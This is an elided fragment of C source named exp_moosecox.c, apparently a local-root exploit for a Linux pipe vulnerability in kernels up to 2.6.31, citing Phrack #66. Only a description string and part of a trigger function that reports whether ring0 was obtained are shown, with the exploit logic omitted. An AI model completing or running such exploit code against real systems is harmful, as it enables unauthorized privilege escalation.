/* exp_moosecox.c
   ...
   following IRC logs (from Phrack #66) so intriguing:
...
char *desc = "MooseCox: Linux-2.X->Linux.2.6.31.unfixed pipe local root";
...
int trigger(void)
{
	...
	if (!exp_state->got_ring0) {
		fprintf(stdout, " [+] Failed to trigger the vulnerability.  Is this a single processor machine?\n");
		return 0;
	}
